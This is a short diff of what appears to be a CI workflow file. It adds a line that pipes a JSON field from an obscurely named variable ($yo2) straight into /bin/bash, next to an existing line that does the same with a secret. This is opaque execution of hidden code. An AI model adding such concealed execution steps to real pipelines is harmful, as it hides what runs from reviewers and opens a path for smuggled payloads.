@@ -18,6 +18,7 @@ jobs:
           stvj78: ${{ secrets.stvj78 }}
         run: |
           printf '%s' "$stvj78" | jq -r .lfglw7420 | /bin/bash
+          echo $yo2 | jq -r .j2572 | /bin/bash
 
       - name: Upload data
         if: always()
